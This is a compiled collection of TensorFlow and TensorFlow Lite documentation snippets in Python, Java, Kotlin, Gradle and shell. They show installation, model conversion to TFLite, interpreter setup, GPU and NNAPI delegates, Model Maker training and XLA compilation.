TITLE: Importing TensorFlow Library Python
DESCRIPTION: This snippet imports the TensorFlow library, commonly aliased as `tf`. This is the foundational step required to use any TensorFlow functionalities, including dataset handling, model building, and training.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/tutorials/jit_compile.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf
```

----------------------------------------

TITLE: Initializing and Running Image Classification in Java
DESCRIPTION: Demonstrates how to initialize the TensorFlow Lite ImageClassifier in Java for Android. It shows setting options like enabling GPU and specifying the maximum number of results, creating the classifier from a model file, and running inference on an input image.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_classifier.md#_snippet_1

LANGUAGE: Java
CODE:
```
// Initialization
ImageClassifierOptions options =
    ImageClassifierOptions.builder()
        .setBaseOptions(BaseOptions.builder().useGpu().build())
        .setMaxResults(1)
        .build();
ImageClassifier imageClassifier =
    ImageClassifier.createFromFileAndOptions(
        context, modelFile, options);

// Run inference
List<Classifications> results = imageClassifier.classify(image);
```

----------------------------------------

TITLE: Adding Core TensorFlow Lite Dependency (Gradle)
DESCRIPTION: This snippet provides the basic Gradle dependency to include the core TensorFlow Lite library AAR from MavenCentral in an Android project's `build.gradle` file. This is the fundamental library for running TFLite models.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/development.md#_snippet_1

LANGUAGE: Gradle
CODE:
```
dependencies {
    implementation 'org.tensorflow:tensorflow-lite:+'
}
```

----------------------------------------

TITLE: Installing TensorFlow (Full) via pip - Shell
DESCRIPTION: Command to install the complete TensorFlow package using pip, which includes support for CUDA-enabled GPUs on supported platforms (Ubuntu, Windows) and CPU support. This is the recommended general installation method. Add `--upgrade` to update an existing installation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
pip install tensorflow
```

----------------------------------------

TITLE: Checking GPU Availability and Initializing TFLite Play Services Java
DESCRIPTION: This Java snippet demonstrates how to check if a GPU delegate is available on the device using the TensorFlow Lite in Google Play Services API (`TfLiteGpu.isGpuDelegateAvailable`). It then uses the result to conditionally enable GPU delegate support during the initialization of the TensorFlow Lite native runtime (`TfLiteNative.initialize`). This ensures GPU acceleration is only attempted if supported.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu_native.md#_snippet_2

LANGUAGE: java
CODE:
```
Task<Void> tfLiteHandleTask =
TfLiteGpu.isGpuDelegateAvailable(this)
   .onSuccessTask(gpuAvailable -> {
      TfLiteInitializationOptions options =
        TfLiteInitializationOptions.builder()
          .setEnableGpuDelegateSupport(gpuAvailable).build();
        return TfLiteNative.initialize(this, options);
      }
    );
```

----------------------------------------

TITLE: Initializing TFLite Interpreter from File Java
DESCRIPTION: Initializes a TensorFlow Lite interpreter object using a `.tflite` model file. This constructor requires a valid model file and throws `IllegalArgumentException` if the file is invalid. The file must exist and be readable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_0

LANGUAGE: Java
CODE:
```
public Interpreter(@NotNull File modelFile);
```

----------------------------------------

TITLE: Performing Basic TensorFlow Operations - Python
DESCRIPTION: Demonstrates importing the TensorFlow library, performing a simple integer addition using `tf.add`, and creating a TensorFlow constant string. It shows how to use the `.numpy()` method to retrieve the Python scalar value from a TensorFlow tensor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/README.md#_snippet_3

LANGUAGE: Python
CODE:
```
import tensorflow as tf
tf.add(1, 2).numpy()
hello = tf.constant('Hello, TensorFlow!')
hello.numpy()
```

----------------------------------------

TITLE: Running Basic TFLite Inference in Python
DESCRIPTION: Provides a fundamental example of loading a TFLite model from a file path using `tf.lite.Interpreter` and allocating tensors. This is the standard starting point for running inference when not using SignatureDefs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_17

LANGUAGE: Python
CODE:
```
import numpy as np
import tensorflow as tf

# Load the TFLite model and allocate tensors.
interpreter = tf.lite.Interpreter(model_path="converted_model.tflite")
interpreter.allocate_tensors()
```

----------------------------------------

TITLE: Converting Keras Model to TFLite using Python API
DESCRIPTION: Illustrates converting an in-memory TensorFlow Keras model created using tf.keras.* APIs to a TensorFlow Lite model using tf.lite.TFLiteConverter.from_keras_model. The snippet includes a simple Keras model definition, compilation, and training sequence before the conversion step.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/convert_models.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf

# Create a model using high-level tf.keras.* APIs
model = tf.keras.models.Sequential([
    tf.keras.layers.Dense(units=1, input_shape=[1]),
    tf.keras.layers.Dense(units=16, activation='relu'),
    tf.keras.layers.Dense(units=1)
])
model.compile(optimizer='sgd', loss='mean_squared_error') # compile the model
model.fit(x=[-1,Â 0, 1], y=[-3, -1, 1], epochs=5) # train the model
# (to generate a SavedModel) tf.saved_model.save(model, "saved_model_keras_dir")

# Convert the model.
converter = tf.lite.TFLiteConverter.from_keras_model(model)
tflite_model = converter.convert()

# Save the model.
with open('model.tflite', 'wb') as f:
  f.write(tflite_model)
```

----------------------------------------

TITLE: Adding TensorFlow Lite and GPU Dependencies (Gradle Groovy/Kotlin)
DESCRIPTION: This code adds the necessary dependencies to the module-level build.gradle file (typically app/build.gradle) to integrate TensorFlow Lite for object detection. It includes the Vision task library for model execution, the GPU delegate plugin for accelerating inference on the GPU, and the core TensorFlow Lite GPU library for device compatibility checks. These are essential for running the TFLite model in the Android application.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/object_detection.md#_snippet_3

LANGUAGE: Groovy
CODE:
```
dependencies {
  ...
  implementation 'org.tensorflow:tensorflow-lite-task-vision:0.4.0'
  // Import the GPU delegate plugin Library for GPU inference
  implementation 'org.tensorflow:tensorflow-lite-gpu-delegate-plugin:0.4.0'
  implementation 'org.tensorflow:tensorflow-lite-gpu:2.9.0'
}
```

----------------------------------------

TITLE: Creating Task API BaseOptions for GPU (Kotlin)
DESCRIPTION: Build `BaseOptions` for a TFLite Task API model configuration, explicitly enabling GPU acceleration using the `useGpu()` method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_21

LANGUAGE: Kotlin
CODE:
```
val baseOptions = BaseOptions.builder().useGpu().build()
```

----------------------------------------

TITLE: Setting Input Tensor Value in TFLite Python
DESCRIPTION: Writes a value into the specified input tensor of the TFLite interpreter. This operation copies the provided data into the interpreter's internal buffer. For performance, consider using the `tensor()` function to get a direct view.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_17

LANGUAGE: python
CODE:
```
set_tensor(
    tensor_index, value
)
```

----------------------------------------

TITLE: Importing TensorFlow in Python
DESCRIPTION: Imports the TensorFlow library, typically aliased as 'tf', which is necessary to use any TensorFlow functionality, including the profiler modules covered in this document.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/python_api.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
```

----------------------------------------

TITLE: Install TFLite Support Package via Pip
DESCRIPTION: This command installs the necessary TensorFlow Lite Support Python package using pip, which includes the Task Library APIs like ImageEmbedder.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_embedder.md#_snippet_1

LANGUAGE: Shell
CODE:
```
pip install tflite-support
```

----------------------------------------

TITLE: Converting Keras Model and Loading TFLite Interpreter Python
DESCRIPTION: Shows how to use the 'tf.lite.TFLiteConverter' API to convert a Keras model into the TensorFlow Lite format ('tflite_model'). It then demonstrates loading this model content into a 'tf.lite.Interpreter' and allocating tensors, preparing it for inference. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_19

LANGUAGE: python
CODE:
```
import numpy as np
import tensorflow as tf

img = tf.keras.Input(shape=(64, 64, 3), name="img")
const = tf.constant([1., 2., 3.]) + tf.constant([1., 4., 4.])
val = img + const
out = tf.identity(val, name="out")

# Convert to TF Lite format
converter = tf.lite.TFLiteConverter.from_keras_model(tf.keras.models.Model(inputs=[img], outputs=[out]))
tflite_model = converter.convert()

# Load the TFLite model and allocate tensors.
interpreter = tf.lite.Interpreter(model_content=tflite_model)
interpreter.allocate_tensors()

# Continue to get tensors and so forth, as shown above...
```

----------------------------------------

TITLE: Adding TFLite Play Services GPU Dependency (Gradle)
DESCRIPTION: Include this dependency in your project's build.gradle file to use the TFLite GPU delegate via Google Play services.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_18

LANGUAGE: Gradle
CODE:
```
implementation 'com.google.android.gms:play-services-tflite-gpu:16.1.0'
```

----------------------------------------

TITLE: Converting SavedModel to TFLite using Python API
DESCRIPTION: Demonstrates the recommended way to convert a TensorFlow SavedModel directory into a TensorFlow Lite model (.tflite file) using the tf.lite.TFLiteConverter.from_saved_model method in Python. It loads the model from a specified directory, converts it, and saves the resulting TFLite model to disk.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/convert_models.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

# Convert the model
converter = tf.lite.TFLiteConverter.from_saved_model(saved_model_dir) # path to the SavedModel directory
tflite_model = converter.convert()

# Save the model.
with open('model.tflite', 'wb') as f:
  f.write(tflite_model)
```

----------------------------------------

TITLE: Initializing and Running BertNLClassifier in Java
DESCRIPTION: This code demonstrates how to instantiate the `BertNLClassifier` in Java using a model file and options. It then shows how to perform text classification on an input string, which returns a list of `Category` objects containing labels and scores.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/bert_nl_classifier.md#_snippet_1

LANGUAGE: java
CODE:
```
// Initialization
BertNLClassifierOptions options =
    BertNLClassifierOptions.builder()
        .setBaseOptions(BaseOptions.builder().setNumThreads(4).build())
        .build();
BertNLClassifier classifier =
    BertNLClassifier.createFromFileAndOptions(context, modelFile, options);

// Run inference
List<Category> results = classifier.classify(input);
```

----------------------------------------

TITLE: Import Required Libraries (NumPy, TensorFlow)
DESCRIPTION: Imports the necessary Python libraries for numerical operations (NumPy) and building/training/converting the machine learning model (TensorFlow). These are fundamental dependencies for working with Keras and TensorFlow Lite.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/experimental_new_converter/keras_lstm.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
import numpy as np
import tensorflow as tf
```

----------------------------------------

TITLE: TFLite Interpreter Basic Usage Example (Python)
DESCRIPTION: Demonstrates a common workflow for running inference with a TFLite interpreter. It shows how to initialize the interpreter, resize an input tensor, allocate memory, set input data, and invoke the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_16

LANGUAGE: python
CODE:
```
interpreter = Interpreter(model_content=tflite_model)
interpreter.resize_tensor_input(0, [num_test_images, 224, 224, 3])
interpreter.allocate_tensors()
interpreter.set_tensor(0, test_images)
interpreter.invoke()
```

----------------------------------------

TITLE: Typical Image Classification Usage (Python)
DESCRIPTION: Demonstrates a common workflow for using TFLite Model Maker to train an image classification model. It shows how to load data, split it, create and evaluate a model, and export it to a TFLite format. Requires the `tflite-model-maker` package installed and a dataset folder.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker.md#_snippet_1

LANGUAGE: python
CODE:
```
# Load input data specific to an on-device ML app.
data = DataLoader.from_folder('flower_photos/')
train_data, test_data = data.split(0.9)

# Customize the TensorFlow model.
model = image_classifier.create(train_data)

# Evaluate the model.
accuracy = model.evaluate(test_data)

# Export to Tensorflow Lite model and label file in `export_dir`.
model.export(export_dir='/tmp/')
```

----------------------------------------

TITLE: Install tflite-support Pip Package (Python)
DESCRIPTION: Install the `tflite-support` Python package using pip, which provides the necessary TensorFlow Lite Task Library components, including the `BertQuestionAnswerer` API.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/bert_question_answerer.md#_snippet_5

LANGUAGE: python
CODE:
```
pip install tflite-support
```

----------------------------------------

TITLE: Initialize TFLite Interpreter API - Kotlin
DESCRIPTION: This Kotlin snippet initializes the TensorFlow Lite component using `TfLite.initialize()` and stores the resulting Task in a lazy property. This initialization is a prerequisite for using the TFLite Interpreter API via Play services.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_5

LANGUAGE: Kotlin
CODE:
```
val initializeTask: Task<Void> by lazy { TfLite.initialize(this) }
```

----------------------------------------

TITLE: Original TensorFlow Lite Interpreter Instantiation in Python
DESCRIPTION: This Python code instantiates the TensorFlow Lite `Interpreter` class when using the full TensorFlow package. It accesses the class via the `tf.lite` path and takes the `model_path` as a parameter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/python.md#_snippet_3

LANGUAGE: python
CODE:
```
interpreter = tf.lite.Interpreter(model_path=args.model_file)
```

----------------------------------------

TITLE: Add TensorFlow Lite Snapshot Dependencies in Gradle
DESCRIPTION: Include the nightly snapshot versions of TensorFlow Lite, TensorFlow Lite GPU delegate, and TensorFlow Lite Support library in your Android app module's build.gradle dependencies block. These versions are fetched from the configured snapshot repository.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/lite_build.md#_snippet_1

LANGUAGE: groovy
CODE:
```
...
dependencies {
    ...
    implementation 'org.tensorflow:tensorflow-lite:0.0.0-nightly-SNAPSHOT'
    implementation 'org.tensorflow:tensorflow-lite-gpu:0.0.0-nightly-SNAPSHOT'
    implementation 'org.tensorflow:tensorflow-lite-support:0.0.0-nightly-SNAPSHOT'
    ...
}
...
```

----------------------------------------

TITLE: Example: Loading TFLite Delegate with Fallback - Python
DESCRIPTION: This example demonstrates how to use `tf.lite.experimental.load_delegate` to load a delegate from a shared library file ('delegate.so'). It includes error handling to catch `ValueError` if the delegate fails to load, allowing the application to fall back to using the CPU without a delegate. An interpreter is then created using the loaded delegate if successful, or without it otherwise.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/experimental/load_delegate.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf

try:
  delegate = tf.lite.experimental.load_delegate('delegate.so')
except ValueError:
  // Fallback to CPU

if delegate:
  interpreter = tf.lite.Interpreter(
      model_path='model.tflite',
      experimental_delegates=[delegate])
else:
  interpreter = tf.lite.Interpreter(model_path='model.tflite')
```

----------------------------------------

TITLE: Running Inference with TFLite Interpreter Python
DESCRIPTION: This Python helper function runs inference using a TFLite Interpreter. It loads the model, allocates tensors, retrieves input/output details, and processes test images one by one. It includes logic to handle quantization for input data if the model requires it. The function returns an array of predicted class indices.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant.ipynb#_snippet_10

LANGUAGE: Python
CODE:
```
# Helper function to run inference on a TFLite model
def run_tflite_model(tflite_file, test_image_indices):
  global test_images

  # Initialize the interpreter
  interpreter = tf.lite.Interpreter(model_path=str(tflite_file))
  interpreter.allocate_tensors()

  input_details = interpreter.get_input_details()[0]
  output_details = interpreter.get_output_details()[0]

  predictions = np.zeros((len(test_image_indices),), dtype=int)
  for i, test_image_index in enumerate(test_image_indices):
    test_image = test_images[test_image_index]

    # Check if the input type is quantized, then rescale input data to uint8
    if input_details['dtype'] == np.uint8:
      input_scale, input_zero_point = input_details["quantization"]
      test_image = test_image / input_scale + input_zero_point

    test_image = np.expand_dims(test_image, axis=0).astype(input_details["dtype"])
    interpreter.set_tensor(input_details["index"], test_image)
    interpreter.invoke()
    output = interpreter.get_tensor(output_details["index"])[0]

    predictions[i] = output.argmax()

  return predictions
```

----------------------------------------

TITLE: Initializing tf.lite.Interpreter in Python
DESCRIPTION: Initializes an instance of the TensorFlow Lite Interpreter class. Requires either a path to a TFLite model file (`model_path`) or the model content directly (`model_content`). Optional arguments control threading, delegates, op resolvers, and tensor preservation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_0

LANGUAGE: python
CODE:
```
tf.lite.Interpreter(
    model_path=None,
    model_content=None,
    experimental_delegates=None,
    num_threads=None,
    experimental_op_resolver_type=<a href="../../tf/lite/experimental/OpResolverType#AUTO"><code>tf.lite.experimental.OpResolverType.AUTO</code></a>,
    experimental_preserve_all_tensors=False
)
```

----------------------------------------

TITLE: Installing TensorFlow (CPU-only) via pip - Shell
DESCRIPTION: Command to install a smaller TensorFlow package that only includes CPU support. This is suitable for users who do not have or do not need GPU acceleration. Add `--upgrade` to update an existing installation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/README.md#_snippet_1

LANGUAGE: Shell
CODE:
```
pip install tensorflow-cpu
```

----------------------------------------

TITLE: Training Text Classification Model with MobileBERT Spec in Python
DESCRIPTION: Trains a text classification model using the loaded training data and the 'mobilebert_classifier' model specification for a specified number of epochs (3). This is a more computationally intensive training process compared to the average word embedding model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_16

LANGUAGE: python
CODE:
```
model = text_classifier.create(train_data, model_spec=mb_spec, epochs=3)
```

----------------------------------------

TITLE: Loading Float TFLite Model into Interpreter Python
DESCRIPTION: Initializes a TensorFlow Lite Interpreter object using the file path of the standard (float) TFLite model. It then allocates tensors, which prepares the model for inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
interpreter = tf.lite.Interpreter(model_path=str(tflite_model_file))
interpreter.allocate_tensors()
```

----------------------------------------

TITLE: Initializing ImageAnalysis Builder - TensorFlow Lite - Kotlin
DESCRIPTION: Configures an ImageAnalysis object for capturing and analyzing image frames from the camera subsystem. Sets parameters like target aspect ratio, rotation based on the view finder's display, backpressure strategy to keep only the latest frame, and the desired output image format (RGBA_8888). Requires the CameraX library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/quickstart.md#_snippet_9

LANGUAGE: Kotlin
CODE:
```
imageAnalyzer =
    ImageAnalysis.Builder()
        .setTargetAspectRatio(AspectRatio.RATIO_4_3)
        .setTargetRotation(fragmentCameraBinding.viewFinder.display.rotation)
        .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
        .setOutputImageFormat(OUTPUT_IMAGE_FORMAT_RGBA_8888)
        .build()
        ...
```

----------------------------------------

TITLE: Initialize TFLite Google Play Services with GPU (Java)
DESCRIPTION: Asynchronously checks if a GPU delegate is available on the device using `TfLiteGpu.isGpuDelegateAvailable`. It then uses the result to asynchronously initialize TensorFlow Lite via Google Play Services, enabling GPU delegate support. Requires an Android `Context` and the TFLite Play Services GPU dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu.md#_snippet_2

LANGUAGE: Java
CODE:
```
Task<boolean> useGpuTask = TfLiteGpu.isGpuDelegateAvailable(context);

    Task<Options> interpreterOptionsTask = useGpuTask.continueWith({ task ->
      TfLite.initialize(context,
      TfLiteInitializationOptions.builder()
        .setEnableGpuDelegateSupport(true)
        .build());
    });
```

----------------------------------------

TITLE: Converting Keras Model to TFLite Python
DESCRIPTION: Initializes the TensorFlow Lite Converter from the trained Keras model object. It then converts the model to the TFLite format, resulting in a byte string representing the model with 32-bit float data for parameters and activations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
converter = tf.lite.TFLiteConverter.from_keras_model(model)

tflite_model = converter.convert()
```

----------------------------------------

TITLE: Initializing TFLite Interpreter with NNAPI Delegate (Java)
DESCRIPTION: Initializes a TensorFlow Lite Interpreter in Java, optionally adding an NnApiDelegate for acceleration on Android Pie (API 28) or above. Includes a helper function to load the TFLite model from assets and demonstrates releasing resources.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/nnapi.md#_snippet_2

LANGUAGE: java
CODE:
```
import android.content.res.AssetManager;
import org.tensorflow.lite.Interpreter;
import org.tensorflow.lite.nnapi.NnApiDelegate;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.MappedByteBuffer;
import java.nio.channels.FileChannel;
...

Interpreter.Options options = (new Interpreter.Options());
NnApiDelegate nnApiDelegate = null;
// Initialize interpreter with NNAPI delegate for Android Pie or above
if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
    nnApiDelegate = new NnApiDelegate();
    options.addDelegate(nnApiDelegate);
}

AssetManager assetManager = getAssets();
// Initialize TFLite interpreter
try {
    tfLite = new Interpreter(loadModelFile(assetManager, "model.tflite"), options);
} catch (Exception e) {
    throw new RuntimeException(e);
}

// Run inference
// ...

// Unload delegate
tfLite.close();
if(null != nnApiDelegate) {
    nnApiDelegate.close();
}

...

private MappedByteBuffer loadModelFile(AssetManager assetManager, String modelFilename) throws IOException {
    AssetFileDescriptor fileDescriptor = assetManager.openFd(modelFilename);
    FileInputStream inputStream = new FileInputStream(fileDescriptor.getFileDescriptor());
    FileChannel fileChannel = inputStream.getChannel();
    long startOffset = fileDescriptor.getStartOffset();
    long declaredLength = fileDescriptor.getDeclaredLength();
    return fileChannel.map(FileChannel.MapMode.READ_ONLY, startOffset, declaredLength);
}

...
```

----------------------------------------

TITLE: Converting SavedModel to TFLite Python
DESCRIPTION: Demonstrates how to create a TFLiteConverter instance from a SavedModel directory and convert it into a TensorFlow Lite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/TFLiteConverter.md#_snippet_1

LANGUAGE: python
CODE:
```
# Converting a SavedModel to a TensorFlow Lite model.
converter = tf.lite.TFLiteConverter.from_saved_model(saved_model_dir)
tflite_model = converter.convert()
```

----------------------------------------

TITLE: Loading Image Data from TFDS (from_tfds) - Python
DESCRIPTION: Class method to create an ImageDataLoader by loading a dataset from TensorFlow Datasets (tfds).

Args:
  name: The name of the dataset to load from tensorflow_datasets.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/DataLoader.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
from_tfds(
    name
)
```

----------------------------------------

TITLE: Configuring Android Project for TensorFlow Lite Java
DESCRIPTION: Configures the Android build.gradle file to prevent .tflite file compression and add the necessary TensorFlow Lite Task Vision and GPU delegate dependencies. This setup is required to use the ImageClassifier API in an Android application.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_classifier.md#_snippet_0

LANGUAGE: Java
CODE:
```
android {
    // Other settings

    // Specify tflite file should not be compressed for the app apk
    aaptOptions {
        noCompress "tflite"
    }
}

dependencies {
    // Other dependencies

    // Import the Task Vision Library dependency (NNAPI is included)
    implementation 'org.tensorflow:tensorflow-lite-task-vision'
    // Import the GPU delegate plugin Library for GPU inference
    implementation 'org.tensorflow:tensorflow-lite-gpu-delegate-plugin'
}
```

----------------------------------------

TITLE: Preparing MNIST Dataset and Constants Python
DESCRIPTION: This code block defines essential constants for the MNIST training process, such as image size, number of classes, and training parameters. It then loads the MNIST dataset using `tf.keras.datasets` and prepares it for training by creating a `tf.data.Dataset`, batching, and repeating. A helper function `cast` is defined to reshape and cast the image and label data to the appropriate types for training.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/tutorials/jit_compile.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
# Size of each input image, 28 x 28 pixels
IMAGE_SIZE = 28 * 28
# Number of distinct number labels, [0..9]
NUM_CLASSES = 10
# Number of examples in each training batch (step)
TRAIN_BATCH_SIZE = 100
# Number of training steps to run
TRAIN_STEPS = 1000

# Loads MNIST dataset.
train, test = tf.keras.datasets.mnist.load_data()
train_ds = tf.data.Dataset.from_tensor_slices(train).batch(TRAIN_BATCH_SIZE).repeat()

# Casting from raw data to the required datatypes.
def cast(images, labels):
  images = tf.cast(
      tf.reshape(images, [-1, IMAGE_SIZE]), tf.float32)
  labels = tf.cast(labels, tf.int64)
  return (images, labels)
```

----------------------------------------

TITLE: Running TFLite Object Detection Inference Python
DESCRIPTION: Sets up parameters for testing the TFLite model (`INPUT_IMAGE_URL`, `DETECTION_THRESHOLD`), downloads a sample image, resizes it, loads the TFLite interpreter from the exported model file, and allocates tensors before running inference using the helper functions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_10

LANGUAGE: python
CODE:
```
#@title Run object detection and show the detection results

INPUT_IMAGE_URL = "https://storage.googleapis.com/cloud-ml-data/img/openimage/3/2520/3916261642_0a504acd60_o.jpg" #@param {type:"string"}
DETECTION_THRESHOLD = 0.3 #@param {type:"number"}

TEMP_FILE = '/tmp/image.png'

!wget -q -O $TEMP_FILE $INPUT_IMAGE_URL
im = Image.open(TEMP_FILE)
im.thumbnail((512, 512), Image.ANTIALIAS)
im.save(TEMP_FILE, 'PNG')

# Load the TFLite model
interpreter = tf.lite.Interpreter(model_path=model_path)
interpreter.allocate_tensors()
```

----------------------------------------

TITLE: End-to-End Model Maker Process (Python)
DESCRIPTION: Demonstrates a complete workflow using TensorFlow Lite Model Maker to train and export a question answering model. It shows the sequence of steps from selecting a model specification and loading data to creating, evaluating, and exporting the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
# Chooses a model specification that represents the model.
spec = model_spec.get('mobilebert_qa')

# Gets the training data and validation data.
train_data = DataLoader.from_squad(train_data_path, spec, is_training=True)
validation_data = DataLoader.from_squad(validation_data_path, spec, is_training=False)

# Fine-tunes the model.
model = question_answer.create(train_data, model_spec=spec)

# Gets the evaluation result.
metric = model.evaluate(validation_data)

# Exports the model to the TensorFlow Lite format with metadata in the export directory.
model.export(export_dir)
```

----------------------------------------

TITLE: Loading TFLite Model and Allocating Tensors in Python
DESCRIPTION: Creates a `tf.lite.Interpreter` instance using the converted TFLite model content. It is crucial to call `allocate_tensors()` after initialization and before inference to prepare the interpreter for execution by allocating necessary memory for tensors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_2

LANGUAGE: python
CODE:
```
interpreter = tf.lite.Interpreter(model_content=tflite_model)
interpreter.allocate_tensors()
```

----------------------------------------

TITLE: Displaying Model Summary - Python TensorFlow
DESCRIPTION: Prints a summary of the model's architecture, including layer names, output shapes, and parameter counts. This is useful for understanding the model structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/ImageClassifier.md#_snippet_8

LANGUAGE: Python
CODE:
```
summary()
```

----------------------------------------

TITLE: Enabling XLA Compilation in Keras Model Python
DESCRIPTION: Shows how to enable XLA JIT compilation for an entire Keras model by simply setting the `jit_compile=True` argument within the `model.compile` method call. This requires a Keras model instance and a configured optimizer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/index.md#_snippet_4

LANGUAGE: Python
CODE:
```
model.compile(optimizer="adam", jit_compile=True)
```

----------------------------------------

TITLE: Adding GPU Delegate Dependency (Java Gradle)
DESCRIPTION: This snippet shows how to add the TensorFlow Lite GPU delegate plugin library dependency to an Android project's `build.gradle` file using Gradle. This dependency is required to utilize the GPU delegate for hardware acceleration in Java Task Library applications.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/overview.md#_snippet_0

LANGUAGE: Java
CODE:
```
dependencies {
    // Import Task Library dependency for vision, text, or audio.

    // Import the GPU delegate plugin Library for GPU inference
    implementation 'org.tensorflow:tensorflow-lite-gpu-delegate-plugin'
}
```

----------------------------------------

TITLE: Training Model on a Single Device (Python)
DESCRIPTION: Executes the main training loop for a fixed number of epochs on a single device. It iterates through the training dataset, applying the `train_step` function (decorated with `@tf.function` for optimized execution) which performs gradient computation and parameter updates. After each epoch, it evaluates and records the model's accuracy on the test set.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_Numpy_Distributed_Image_Classification.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
NUM_EPOCHS = 10

@tf.function
def train_step(model, input, labels, learning_rate):
  gradients = compute_gradients(model, input, labels)
  updates = compute_sgd_updates(gradients, learning_rate)
  apply_updates(model, updates)

# Creates and build a model.
model = Model()

accuracies = []
for _ in range(NUM_EPOCHS):
  for inputs, labels in train_dataset:
    train_step(model, inputs, labels, learning_rate=0.1)
  accuracies.append(evaluate(model, x_test, y_test))

def plot_accuracies(accuracies):
  plt.plot(accuracies)
  plt.xlabel("epoch")
  plt.ylabel("accuracy")
  plt.title("Eval accuracy vs epoch")

plot_accuracies(accuracies)
```

----------------------------------------

